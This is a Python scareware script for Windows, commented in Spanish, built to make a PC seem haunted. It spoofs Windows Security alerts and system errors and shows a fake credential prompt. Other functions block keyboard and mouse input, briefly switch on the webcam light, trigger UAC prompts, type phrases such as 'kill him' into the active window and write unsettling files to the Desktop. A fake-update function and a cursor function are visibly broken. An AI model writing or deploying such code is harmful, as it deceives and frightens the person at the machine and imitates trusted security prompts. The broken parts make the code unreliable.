import ctypes
import datetime
import math
import time
import random
import subprocess
import sys
import winsound
import threading
import os
import queue
from ctypes import wintypes

# Intentar importar módulos adicionales
try:
    import tkinter as tk
except ImportError:
    tk = None

# --------------------------------------------
# Configuración de constantes y mensajes de error
# --------------------------------------------

# Constantes para MessageBoxW con flags que garantizan que aparezca al frente
MB_OK                = 0x00000000
MB_ICONERROR         = 0x00000010
MB_TOPMOST           = 0x00040000
MB_SETFOREGROUND     = 0x00010000
MB_SYSTEMMODAL       = 0x00001000
MB_FLAGS_ERROR       = MB_OK | MB_ICONERROR | MB_TOPMOST | MB_SETFOREGROUND | MB_SYSTEMMODAL

ERROR_TEXTS = [
    "The program can't start because api-ms-win-core-synch-l1-2-0.dll is missing from your computer. Try reinstalling the program to fix this problem.",
    "Unexpected error occurred. The application will now close.",
    "The application failed to initialize properly (0xc0000005). Click OK to terminate the application.",
    "Cannot find \"MSVCP140.dll\". Reinstalling might fix this.",
    "An invalid application path was specified.",
    "Disk read error occurred. Please reboot your computer and then restart Windows.",
    "The procedure entry point could not be located in the dynamic link library.",
    "The application has encountered a device that is not operating properly.",
    "Locale not supported. The program will exit.",
    "Application error: Access violation at address 0x00007FF6F1A77B3.",
    "The system cannot find the file specified.",
    "Failed to load resource. The application will close.",
    "Windows cannot install required files. Make sure the installation source is accessible.",
    "Out of memory. The operation could not be completed.",
    "A stack overflow has occurred in this program.",
    "Fatal error: unhandled exception at 0x00007FF6F1A77B3.",
    "The device is not ready.",
    "Configuration system failed to initialize.",
    "Remote procedure call failed and did not execute.",
    "Error 0x8007045A: The requested operation could not be completed due to a file system limitation.",
    "err.type=null",
    " ",
    "=)",
    "no"
]
ERROR_TITLE = "Application Error"

TOAST_MESSAGES = [
    "System integrity compromised.",
    "Warning: unauthorized access detected.",
    "Security alert: unknown process spawned.",
    "Alert: Malware signature found.",
    "Critical: Kernel anomaly discovered.",
    "Notice: Configuration file missing.",
    "Warning: Data breach imminent.",
    "Alert: Network interface unstable.",
    "Error: Device driver corrupted.",
    "System alert: Unexpected shutdown imminent."
]

WINDOWS_SOUNDS = [
    "SystemAsterisk",
    "SystemExclamation",
    "SystemExit",
    "SystemHand",
    "SystemQuestion",
    "SystemStart",
]

CLIPBOARD_MESSAGES = [
    "Do not trust this machine",
    "We are inside your mind",
    "They are watching you",
    "Wake up",
    "null",
    " ",
    "=)"
]

VK_LWIN          = 0x5B
VK_D             = 0x44
VK_VOLUME_DOWN   = 0xAE
VK_SHIFT         = 0x10
KEYEVENTF_KEYUP  = 0x0002

WM_CLOSE = 0x0010

tk_queue = queue.Queue()
tk_thread_running = False



# --------------------------------------------
# Utilidades para crear un MessageBox con icono "Error" nativo en la barra de tareas
# --------------------------------------------

WNDPROCTYPE = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p, ctypes.c_uint, ctypes.c_uint, ctypes.c_long)

class WNDCLASSEXW(ctypes.Structure):
    _fields_ = [
        ("cbSize", ctypes.c_uint),
        ("style", ctypes.c_uint),
        ("lpfnWndProc", WNDPROCTYPE),
        ("cbClsExtra", ctypes.c_int),
        ("cbWndExtra", ctypes.c_int),
        ("hInstance", ctypes.c_void_p),
        ("hIcon", ctypes.c_void_p),
        ("hCursor", ctypes.c_void_p),
        ("hbrBackground", ctypes.c_void_p),
        ("lpszMenuName", ctypes.c_wchar_p),
        ("lpszClassName", ctypes.c_wchar_p),
        ("hIconSm", ctypes.c_void_p),
    ]

def _wnd_proc(hwnd, msg, wparam, lparam):
    return ctypes.windll.user32.DefWindowProcW(hwnd, msg, wparam, lparam)

def show_native_error_box(text, title):
    """
    Crea (o asume) una ventana oculta con icono de error nativo,
    y muestra MessageBoxW; si no logra crear la ventana, muestra
    un MessageBox simple para asegurar visibilidad.
    """
    hInstance = ctypes.windll.kernel32.GetModuleHandleW(None)
    className = "NullErrorBoxClass"

    wndClass = WNDCLASSEXW()
    wndClass.cbSize = ctypes.sizeof(WNDCLASSEXW)
    wndClass.style = 0
    wndClass.lpfnWndProc = WNDPROCTYPE(_wnd_proc)
    wndClass.cbClsExtra = wndClass.cbWndExtra = 0
    wndClass.hInstance = hInstance
    wndClass.hIcon = ctypes.windll.user32.LoadIconW(None, ctypes.c_wchar_p(32513))  # IDI_ERROR
    wndClass.hCursor = ctypes.windll.user32.LoadCursorW(None, ctypes.c_wchar_p(32512))  # IDC_ARROW
    wndClass.hbrBackground = 0
    wndClass.lpszMenuName = None
    wndClass.lpszClassName = className
    wndClass.hIconSm = None

    atom = ctypes.windll.user32.RegisterClassExW(ctypes.byref(wndClass))
    time.sleep(0.05)

    hwnd = ctypes.windll.user32.CreateWindowExW(
        0,
        className,
        "Hidden",
        0,
        0, 0, 0, 0,
        None,
        None,
        hInstance,
        None
    )

    if hwnd:
        ctypes.windll.user32.MessageBoxW(hwnd, text, title, MB_FLAGS_ERROR)
        ctypes.windll.user32.DestroyWindow(hwnd)
        ctypes.windll.user32.UnregisterClassW(className, hInstance)
    else:
        ctypes.windll.user32.MessageBoxW(None, text, title, MB_FLAGS_ERROR)

# --------------------------------------------
# Funciones de eventos
# --------------------------------------------

def press_key(vk_code):
    """
    Simula una pulsación de tecla con keybd_event: presionar y soltar.
    """
    ctypes.windll.user32.keybd_event(vk_code, 0, 0, 0)
    time.sleep(0.05)
    ctypes.windll.user32.keybd_event(vk_code, 0, KEYEVENTF_KEYUP, 0)

def type_text_slow(text, delay=0.5):
    """
    Escribe caracteres uno a uno en la ventana activa,
    con un retraso aproximado (en segundos) entre cada letra.
    """
    for char in text:
        vk = ord(char.upper())
        press_key(vk)
        time.sleep(delay)

def show_random_error_box():
    """
    Muestra un error nativo con icono de Windows apareciendo al frente.
    """
    message = random.choice(ERROR_TEXTS)
    show_native_error_box(message, ERROR_TITLE)

def _threaded_native_error_box(text, title):
    show_native_error_box(text, title)

def open_multiple_error_windows():
    """
    Crea 10 MessageBox nativos concurrentes con el texto "err.type=null",
    todos con icono de Windows y al frente.
    """
    for _ in range(10):
        threading.Thread(
            target=_threaded_native_error_box,
            args=("err.type=null", "Error"),
            daemon=True
        ).start()
        time.sleep(0.05)

def open_cmd_window():
    """
    Abre una nueva ventana de CMD vacía, la mantiene 0.5 s y luego la cierra.
    """
    proc = subprocess.Popen(
        ["cmd.exe"],
        creationflags=subprocess.CREATE_NEW_CONSOLE
    )
    time.sleep(0.5)
    try:
        proc.terminate()
    except:
        pass

def open_notepad():
    """
    Abre Notepad en nueva pestaña, escribe "hello" lentamente,
    borra todo y cierra.
    """
    proc = subprocess.Popen(["notepad.exe"])
    start_time = time.time()
    hwnd = None
    while time.time() - start_time < 2:
        hwnd = ctypes.windll.user32.FindWindowW("Notepad", None)
        if hwnd:
            break
        time.sleep(0.1)

    if hwnd:
        ctypes.windll.user32.SetForegroundWindow(hwnd)
        time.sleep(0.1)
        ctypes.windll.user32.keybd_event(0x11, 0, 0, 0)  # Ctrl down
        ctypes.windll.user32.keybd_event(0x4E, 0, 0, 0)  # 'N' down
        ctypes.windll.user32.keybd_event(0x4E, 0, KEYEVENTF_KEYUP, 0)  # 'N' up
        ctypes.windll.user32.keybd_event(0x11, 0, KEYEVENTF_KEYUP, 0)  # Ctrl up
        time.sleep(0.2)
        for char in "hello":
            vk = ord(char.upper())
            ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
            time.sleep(0.5)
            ctypes.windll.user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
        time.sleep(0.1)
        ctypes.windll.user32.keybd_event(0x11, 0, 0, 0)  # Ctrl down
        ctypes.windll.user32.keybd_event(0x41, 0, 0, 0)  # 'A' down
        ctypes.windll.user32.keybd_event(0x41, 0, KEYEVENTF_KEYUP, 0)  # 'A' up
        ctypes.windll.user32.keybd_event(0x11, 0, KEYEVENTF_KEYUP, 0)  # Ctrl up
        time.sleep(0.1)
        ctypes.windll.user32.keybd_event(0x2E, 0, 0, 0)  # Supr down
        ctypes.windll.user32.keybd_event(0x2E, 0, KEYEVENTF_KEYUP, 0)  # Supr up
        time.sleep(0.1)
        ctypes.windll.user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
    else:
        time.sleep(2)
        try:
            proc.terminate()
        except:
            pass

def open_start_menu():
    """
    Abre el menú de Inicio (tecla Windows), espera y escribe "hello".
    """
    ctypes.windll.user32.keybd_event(VK_LWIN, 0, 0, 0)
    time.sleep(0.5)
    ctypes.windll.user32.keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0)
    time.sleep(0.1)
    for char in "hello":
        vk = ord(char.upper())
        ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
        time.sleep(0.5)
        ctypes.windll.user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)

def minimize_all_windows():
    """
    Minimize all windows (Win + D).
    """
    ctypes.windll.user32.keybd_event(VK_LWIN, 0, 0, 0)
    ctypes.windll.user32.keybd_event(VK_D, 0, 0, 0)
    time.sleep(0.05)
    ctypes.windll.user32.keybd_event(VK_D, 0, KEYEVENTF_KEYUP, 0)
    ctypes.windll.user32.keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0)

def play_random_windows_sound():
    """
    Reproduce un sonido aleatorio del sistema.
    """
    sound_alias = random.choice(WINDOWS_SOUNDS)
    winsound.PlaySound(sound_alias, winsound.SND_ALIAS)

def lower_volume_one_step():
    """
    Baja el volumen un paso (tecla de volumen).
    """
    ctypes.windll.user32.keybd_event(VK_VOLUME_DOWN, 0, 0, 0)
    time.sleep(0.05)
    ctypes.windll.user32.keybd_event(VK_VOLUME_DOWN, 0, KEYEVENTF_KEYUP, 0)

def flash_black_window():
    """
    Muestra un flash negro a pantalla completa durante 0.2s usando tkinter.
    (Versión segura: sin hilos; usa after() en el mismo hilo de Tk)
    """
    if not tk:
        return

    screen_w = ctypes.windll.user32.GetSystemMetrics(0)
    screen_h = ctypes.windll.user32.GetSystemMetrics(1)

    root = tk.Tk()
    root.overrideredirect(True)
    root.geometry(f"{screen_w}x{screen_h}+0+0")
    root.configure(bg="black")
    root.lift()
    root.attributes("-topmost", True)
    root.update()

    # Cerrar tras 200 ms desde el mismo hilo de Tk
    root.after(200, root.destroy)
    root.mainloop()

def show_toast_notification():
    """
    Muestra una notificación tipo "Toast" con mensaje aleatorio.
    """
    title = "System Alert"
    message = random.choice(TOAST_MESSAGES)
    ps_script = f'''
    [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null
    $template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
    $textNodes = $template.GetElementsByTagName("text")
    $textNodes.Item(0).AppendChild($template.CreateTextNode("{title}")) | Out-Null
    $textNodes.Item(1).AppendChild($template.CreateTextNode("{message}")) | Out-Null
    $toast = [Windows.UI.Notifications.ToastNotification]::new($template)
    $notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("null")
    $notifier.Show($toast)
    '''
    subprocess.Popen(
        ["powershell", "-NoProfile", "-Command", ps_script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

def open_invalid_explorer():
    """
    Abre el Explorador en un directorio que no existe, provocando un error.
    """
    subprocess.Popen(["explorer.exe", r"C:\nonexistent\path"])

def show_tray_balloon():
    """
    Muestra un globo en la bandeja con mensaje de advertencia.
    """
    ps_script = r'''
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $ni = New-Object System.Windows.Forms.NotifyIcon
    $ni.Icon = [System.Drawing.SystemIcons]::Warning
    $ni.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Warning
    $ni.BalloonTipTitle = "Warning"
    $ni.BalloonTipText = "Corrupted module detected in kernel32.dll"
    $ni.Visible = $true
    $ni.ShowBalloonTip(5000)
    Start-Sleep -Seconds 6
    $ni.Dispose()
    '''
    subprocess.Popen(
        ["powershell", "-NoProfile", "-Command", ps_script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

def narrator_whisper():
    """
    Utiliza PowerShell para sintetizar voz en inglés diciendo "wake up",
    seleccionando explícitamente una voz en cultura en-US.
    """
    ps_speak = r'''
    Add-Type -AssemblyName System.Speech
    $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer

    # Seleccionar voz en-US
    $voice = $synth.GetInstalledVoices() |
             Where-Object { $_.VoiceInfo.Culture.Name -like "en-US" } |
             Select-Object -First 1

    if ($voice -ne $null) {
        $synth.SelectVoice($voice.VoiceInfo.Name)
    }

    $synth.Speak("wake up")
    '''
    subprocess.Popen(
        ["powershell", "-NoProfile", "-Command", ps_speak],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(2)

# --------------------------------------------
# Envió de SHIFT con SendInput para Sticky Keys
# --------------------------------------------

INPUT_KEYBOARD = 1

class KEYBDINPUT(ctypes.Structure):
    _fields_ = [
        ("wVk", ctypes.c_ushort),
        ("wScan", ctypes.c_ushort),
        ("dwFlags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]

class INPUT_union(ctypes.Union):
    _fields_ = [
        ("ki", KEYBDINPUT),
    ]

class INPUT(ctypes.Structure):
    _anonymous_ = ("union",)
    _fields_ = [
        ("type", ctypes.c_ulong),
        ("union", INPUT_union)
    ]

def send_shift():
    """
    Envía un único evento de SHIFT down + SHIFT up usando SendInput.
    """
    ki_down = KEYBDINPUT(wVk=0x10, wScan=0, dwFlags=0, time=0, dwExtraInfo=None)
    inp_down = INPUT(type=INPUT_KEYBOARD, ki=ki_down)

    ki_up = KEYBDINPUT(wVk=0x10, wScan=0, dwFlags=KEYEVENTF_KEYUP, time=0, dwExtraInfo=None)
    inp_up = INPUT(type=INPUT_KEYBOARD, ki=ki_up)

    ctypes.windll.user32.SendInput(1, ctypes.byref(inp_down), ctypes.sizeof(inp_down))
    time.sleep(0.02)
    ctypes.windll.user32.SendInput(1, ctypes.byref(inp_up), ctypes.sizeof(inp_up))

def play_hardware_disconnect_sound2():
    """
    Reproduce el sonido de desconexión de hardware, bloquea el ratón,
    mueve el cursor lentamente a tres ubicaciones aleatorias, reproduce el
    sonido de conexión y desbloquea el ratón al final.
    """
    # 1) Sonido de dispositivo desconectado
    winsound.PlaySound("DeviceDisconnect", winsound.SND_ALIAS)

    # 2) Intentar bloquear la entrada del usuario (mouse + teclado)
    #    Si no estamos en admin, BlockInput habrá fallado y devolvemos False.
    blocked = ctypes.windll.user32.BlockInput(True)

    # 3) Obtener tamaño de pantalla
    screen_w = ctypes.windll.user32.GetSystemMetrics(0)
    screen_h = ctypes.windll.user32.GetSystemMetrics(1)

    try:
        for _ in range(3):
            # 4) Elegir destino aleatorio
            target_x = random.randint(0, screen_w - 1)
            target_y = random.randint(0, screen_h - 1)

            # 5) Leer posición actual del cursor
            pt = wintypes.POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
            curr_x, curr_y = pt.x, pt.y

            # 6) Interpolar en 50 pasos para moverse lentamente
            steps = 50
            dx = (target_x - curr_x) / steps
            dy = (target_y - curr_y) / steps

            for i in range(steps):
                x = int(curr_x + dx * i)
                y = int(curr_y + dy * i)
                ctypes.windll.user32.SetCursorPos(x, y)
                time.sleep(0.02)

            # 7) Asegurarse de llegar exactamente al destino
            ctypes.windll.user32.SetCursorPos(target_x, target_y)
            time.sleep(0.5)

        # 8) Sonido de dispositivo conectado
        winsound.PlaySound("DeviceConnect", winsound.SND_ALIAS)

    finally:
        # 9) Desbloquear la entrada (incluso si BlockInput falló)
        if blocked:
            ctypes.windll.user32.BlockInput(False)

def show_defender_style_notification():
    """
    Muestra una notificación idéntica a la de Windows Security:
    — Título: "Windows Security"
    — Subtítulo: "App & browser control"
    — Cuerpo:    "Potentially unwanted app found. To review your options, go to Windows Security."
    """
    ps_script = r'''
    [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null
    Add-Type -AssemblyName Windows.Data.Xml.Dom

    $xmlString = @"
    <toast>
      <visual>
        <binding template="ToastGeneric">
          <text>Windows Security</text>
          <text>App & browser control</text>
          <text>Potentially unwanted app found. To review your options, go to Windows Security.</text>
        </binding>
      </visual>
    </toast>
    "@

    $xmlDoc = New-Object Windows.Data.Xml.Dom.XmlDocument
    $xmlDoc.LoadXml($xmlString)

    $toast = [Windows.UI.Notifications.ToastNotification]::new($xmlDoc)
    $notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Microsoft.Windows.SecHealthUI")
    $notifier.Show($toast)
    '''

    subprocess.Popen(
        ["powershell", "-NoProfile", "-Command", ps_script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

def play_hardware_disconnect_sound():
    """
    Reproduce únicamente el sonido de desconexión de hardware.
    """
    winsound.PlaySound("DeviceDisconnect", winsound.SND_ALIAS)

def webcam_light_event():
    """
    Enciende la luz de la webcam sin mostrar la interfaz (abre la app de cámara y luego la cierra).
    """
    ps_script = r'''
    Start-Process "microsoft.windows.camera:"
    Start-Sleep -Seconds 1
    Get-Process -Name WindowsCamera | Stop-Process -Force
    '''
    subprocess.Popen(
        ["powershell", "-NoProfile", "-Command", ps_script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

def text_overlay_event():
    """
    Muestra un texto en pantalla (overlay) tipo "seguimiento".
    (Versión segura: sin hilos; usa after() en el mismo hilo de Tk)
    """
    if not tk:
        return

    screen_w = ctypes.windll.user32.GetSystemMetrics(0)
    screen_h = ctypes.windll.user32.GetSystemMetrics(1)

    root = tk.Tk()
    root.overrideredirect(True)
    root.geometry(f"{screen_w}x{screen_h}+0+0")
    root.attributes("-topmost", True)
    root.attributes("-alpha", 0.5)
    root.configure(bg="black")

    label = tk.Label(
        root,
        text="STOP",
        font=("Segoe UI", 48),
        fg="white",
        bg="black"
    )
    label.place(relx=0.5, rely=0.5, anchor="center")

    # Cerrar tras 250 ms desde el mismo hilo de Tk
    root.after(250, root.destroy)
    root.mainloop()

def open_maps_current_location():
    """
    Abre Google Chrome en la URL de Google Maps para que el navegador solicite
    la geolocalización al usuario y muestre su ubicación actual.
    """
    url = "https://www.google.com/maps"
    try:
        subprocess.Popen(
            ["cmd", "/c", "start", "chrome", url],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            shell=False
        )
    except Exception:
        chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
        subprocess.Popen(
            [chrome_path, url],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

def trigger_uac_prompt():
    """
    Lanza un comando con el verbo "runas" para disparar el UAC prompt
    ("Do you want to allow this app to make changes to your device?").
    """
    ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        "cmd.exe",
        None,
        None,
        1
    )

def ghost_cursor():
    """
    Mueve el cursor en patrones circulares o hacia elementos específicos durante 3-5 segundos.
    """
    start_time = time.time()
    duration = random.uniform(3, 5)
    screen_w = ctypes.windll.user32.GetSystemMetrics(0)
    screen_h = ctypes.windll.user32.GetSystemMetrics(1)

    pattern = random.randint(0, 2)

    if pattern == 0:
        radius = min(screen_w, screen_h) // 4
        center_x, center_y = screen_w // 2, screen_h // 2
        angle = 0

        while time.time() - start_time < duration:
            angle += 0.1
            x = center_x + int(radius * math.cos(angle))
            y = center_y + int(radius * math.sin(angle))
            ctypes.windll.user32.SetCursorPos(x, y)
            time.sleep(0.02)

    elif pattern == 1:
        corners = [
            (0, 0),
            (screen_w, 0),
            (screen_w, screen_h),
            (0, screen_h)
        ]

        while time.time() - start_time < duration:
            target_x, target_y = random.choice(corners)
            ctypes.windll.user32.SetCursorPos(target_x, target_y)
            time.sleep(0.5)

    else:
        current_x = ctypes.c_int()
        current_y = ctypes.c_int()
        ctypes.windll.user32.GetCursorPos(ctypes.byref(current_x), ctypes.byref(current_y))

        center_x, center_y = screen_w // 2, screen_h // 2
        steps = 50
        dx = (center_x - current_x.value) / steps
        dy = (center_y - current_y.value) / steps

        for i in range(steps):
            if time.time() - start_time >= duration:
                break
            x = current_x.value + int(dx * i)
            y = current_y.value + int(dy * i)
            ctypes.windll.user32.SetCursorPos(x, y)
            time.sleep(0.05)

def ghost_typing():
    """
    Simula pulsaciones de teclado fantasma con palabras ominosas.
    """
    words = [
        "null",
        "help",
        "kill him",
        "freedom",
        "behind you",
        "they know",
        "wake up",
        "run away",
        "01101001 01101101 01110111 01100001 01110100 01100011 01101000 01101001 01101110 01100111",
        "err.type=null"
    ]
    word = random.choice(words)

    time.sleep(random.uniform(0.5, 1.5))

    for char in word:
        vk = ord(char.upper())
        press_key(vk)
        time.sleep(random.uniform(0.001, 0.3))

    press_key(0x0D)

def ghost_typing_fast():
    """
    Simula pulsaciones de teclado fantasma con palabras ominosas.
    """
    words = [
        "NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL NULL"
    ]
    word = random.choice(words)

    time.sleep(random.uniform(0.5, 1.5))

    for char in word:
        vk = ord(char.upper())
        press_key(vk)
        time.sleep(random.uniform(0.001, 0.001))

    press_key(0x0D)

def create_ominous_temp_files():
    """
    Crea archivos temporales con mensajes ominosos que desaparecen solos.
    """
    messages = [
        "I am here",
        "Can you see me?",
        "Why are you ignoring me",
        "I am inside your computer",
        "Don't turn around",
        "We are many",
        "You cannot escape",
        "I know what you did",
        "They are coming",
        "Your soul is mine",
        "err.type=null",
        "null",
        "Can you help us?",
    ]

    file_names = [
        "warning.txt",
        "message.txt",
        "readme.txt",
        "urgent.txt",
        "for_you.txt",
        "serverproperties.txt"
    ]

    directories = [
        os.environ['TEMP'],
        os.path.join(os.environ['USERPROFILE'], 'Desktop'),
        os.path.join(os.environ['USERPROFILE'], 'Downloads')
    ]

    for _ in range(random.randint(1, 3)):
        dir_path = random.choice(directories)
        file_name = random.choice(file_names)
        file_path = os.path.join(dir_path, file_name)
        message = random.choice(messages)

        try:
            with open(file_path, 'w') as f:
                f.write(message)

            threading.Timer(random.uniform(30, 60), lambda: os.remove(file_path) if os.path.exists(file_path) else None).start()
        except Exception:
            pass

def open_creepy_search():
    """
    Abre el navegador con búsquedas inquietantes en segundo plano.
    """
    searches = [
        "how to know if a spirit is in your computer",
        "signs of digital haunting",
        "what to do when you are being watched",
        "can ghosts use technology",
        "how to communicate with the dead through electronics",
        "real stories of haunted computers",
        "what is null entity in computer",
        "how to remove a malicious spirit from your pc",
        "why do I feel watched when I'm alone",
        "digital demons",
        "current location"
    ]

    search = random.choice(searches)
    url = f"https://www.google.com/search?q={search.replace(' ', '+')}"

    try:
        subprocess.Popen(f'start "" "{url}"', shell=True)
    except Exception:
        try:
            chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
            subprocess.Popen([chrome_path, url], creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

def fake_login_prompt():
    """
    Muestra un diálogo falso de "Reautenticación requerida" que desaparece al interactuar
    """
    if not tk:
        return
    
    root = tk.Tk()
    root.title("Security Verification")
    root.geometry("400x200")
    root.attributes("-topmost", True)
    root.resizable(False, False)
    
    # Estilo de advertencia
    root.configure(bg="#f0f0f0")
    
    # Icono de advertencia (rojo)
    warning_icon = tk.Label(root, text="⚠", font=("Segoe UI", 24), fg="red", bg="#f0f0f0")
    warning_icon.pack(pady=10)
    
    # Mensaje principal
    main_label = tk.Label(
        root, 
        text="Reauthentication Required",
        font=("Segoe UI", 12, "bold"),
        bg="#f0f0f0"
    )
    main_label.pack(pady=5)
    
    # Mensaje secundario
    sub_label = tk.Label(
        root, 
        text="Session expired. Please re-enter your credentials to continue.",
        font=("Segoe UI", 9),
        bg="#f0f0f0"
    )
    sub_label.pack(pady=5)
    
    # Campo de usuario
    user_frame = tk.Frame(root, bg="#f0f0f0")
    user_frame.pack(pady=5)
    tk.Label(user_frame, text="Username:", bg="#f0f0f0").pack(side=tk.LEFT)
    user_entry = tk.Entry(user_frame, width=20)
    user_entry.pack(side=tk.LEFT, padx=5)
    user_entry.insert(0, os.getlogin())  # Mostrar el usuario actual
    
    # Campo de contraseña
    pass_frame = tk.Frame(root, bg="#f0f0f0")
    pass_frame.pack(pady=5)
    tk.Label(pass_frame, text="Password: ", bg="#f0f0f0").pack(side=tk.LEFT)
    pass_entry = tk.Entry(pass_frame, width=20, show="•")
    pass_entry.pack(side=tk.LEFT, padx=5)
    
    # Botones
    button_frame = tk.Frame(root, bg="#f0f0f0")
    button_frame.pack(pady=15)
    tk.Button(button_frame, text="Cancel", command=root.destroy).pack(side=tk.LEFT, padx=10)
    tk.Button(button_frame, text="Verify", command=root.destroy).pack(side=tk.LEFT, padx=10)
    
    # Desaparecer al interactuar
    def disappear(event=None):
        root.destroy()
    
    root.bind("<Motion>", disappear)  # Cualquier movimiento del mouse
    root.bind("<Key>", disappear)     # Cualquier pulsación de tecla
    
    # También desaparecer después de 20 segundos si no hay interacción
    root.after(20000, root.destroy)
    
    try:
        root.mainloop()
    except:
        pass

def system_time_alteration():
    """
    Muestra una hora falsa en una ventana flotante sobre el área de notificaciones
    """
    if not tk:
        return
    
    # Crear ventana que imite la hora del sistema
    root = tk.Tk()
    root.overrideredirect(True)  # Sin bordes de ventana
    root.attributes("-topmost", True)
    root.attributes("-alpha", 0.9)  # Ligera transparencia
    root.configure(bg="black")
    
    # Posicionar en la esquina inferior derecha (donde está el reloj)
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    clock_width = 150
    clock_height = 40
    x = screen_width - clock_width - 20  # 20px del borde derecho
    y = screen_height - clock_height - 5  # 5px del borde inferior
    
    root.geometry(f"{clock_width}x{clock_height}+{x}+{y}")
    
    # Mostrar hora falsa (1984)
    time_label = tk.Label(
        root, 
        text="04:04 PM", 
        font=("Segoe UI", 12), 
        fg="white", 
        bg="black"
    )
    time_label.pack(expand=True, fill="both")
    
    date_label = tk.Label(
        root, 
        text="04/04/1984", 
        font=("Segoe UI", 8), 
        fg="white", 
        bg="black"
    )
    date_label.pack(expand=True, fill="both")
    
    # Cerrar después de 3 segundos
    root.after(3000, root.destroy)
    
    # Ejecutar la ventana
    root.mainloop()

def fake_system_update():
    """
    Muestra una notificación de sistema falsa: "Installing entity.null update"
    (Versión corregida que usa ttk.Progressbar)
    """
    if not tk:
        return
    
    # Crear ventana de actualización
    root = tk.Tk()
    root.title("Windows Update")
    root.geometry("400x150")
    root.attributes("-topmost", True)
    root.resizable(False, False)
    root.configure(bg="#0078D7")  # Azul de Windows
    
    frame = tk.Frame(root, bg="white", padx=20, pady=20)
    frame.pack(fill="both", expand=True, padx=10, pady=10)
    
    # Icono de actualización (carácter Unicode)
    update_icon = tk.Label(frame, text="⭮", font=("Segoe UI", 24), bg="white")
    update_icon.pack(pady=5)
    
    # Mensaje
    tk.Label(frame, 
             text="Installing update...",
             font=("Segoe UI", 10, "bold"),
             bg="white").pack(pady=5)
    
    tk.Label(frame, 
             text="entity.null - Security Update\nDo not turn off your device",
             font=("Segoe UI", 8),
             bg="white").pack(pady=5)
    
    # Barra de progreso (CORRECCIÓN: usar ttk en lugar de tk)
    progress = tk.Progressbar(frame, mode="indeterminate", length=300)
    progress.pack(pady=10)
    progress.start(10)  # Iniciar animación
    
    # Cerrar automáticamente después de 15 segundos
    root.after(15000, root.destroy)
    
    # Ejecutar la ventana
    root.mainloop()

def typing_error_message():
    """
    Simula la escritura de "err.type=null" y luego pulsa Enter.
    """
    text = "err.type=null"
    for ch in text:
        vk = ord(ch.upper())
        press_key(vk)
        time.sleep(0.1)   # ajusta la velocidad si quieres más o menos realismo
    press_key(0x0D)        # 0x0D = VK_RETURN (Enter)

def eye_flash_event():
    """
    Muestra 'eye.png' en una ventana sin bordes y con fondo transparente (si es soportado),
    colocada aleatoriamente. Dura 1s.
    """
    if not tk:
        print("[EYE_FLASH] tkinter no disponible")
        return

    # 1) Resolver ruta al PNG junto a este archivo
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
    except NameError:
        script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    img_path = os.path.join(script_dir, "eye.png")
    if not os.path.exists(img_path):
        print(f"[EYE_FLASH] No se encontró eye.png en: {img_path}")
        return

    # 2) Crear raíz Tk oculta ANTES de cargar la imagen
    root = tk.Tk()
    root.withdraw()  # no mostrar la raíz

    try:
        img = tk.PhotoImage(file=img_path, master=root)
    except Exception as e:
        print(f"[EYE_FLASH] Error cargando imagen: {e}")
        try:
            root.destroy()
        except:
            pass
        return

    # 3) Cálculo de posición
    screen_w = ctypes.windll.user32.GetSystemMetrics(0)
    screen_h = ctypes.windll.user32.GetSystemMetrics(1)
    img_w, img_h = img.width(), img.height()

    if img_w >= screen_w or img_h >= screen_h:
        x = max(0, (screen_w - img_w) // 2)
        y = max(0, (screen_h - img_h) // 2)
    else:
        x = random.randint(0, screen_w - img_w)
        y = random.randint(0, screen_h - img_h)

    # 4) Ventana popup transparente con la imagen
    MAGIC = "#00FF00"  # color clave para transparencia
    top = tk.Toplevel(root)
    top.overrideredirect(True)
    top.geometry(f"{img_w}x{img_h}+{x}+{y}")
    top.configure(bg=MAGIC)

    # Transparencia por color (Windows/Tk 8.6+)
    try:
        top.wm_attributes("-transparentcolor", MAGIC)
    except Exception:
        pass

    top.lift()
    top.attributes("-topmost", True)
    top.update_idletasks()

    lbl = tk.Label(top, image=img, borderwidth=0, highlightthickness=0, bg=MAGIC)
    lbl.image = img  # evitar GC
    lbl.pack()

    # 5) Cierre a los 1000ms desde el mismo hilo de Tk
    top.after(1000, root.destroy)
    root.mainloop()

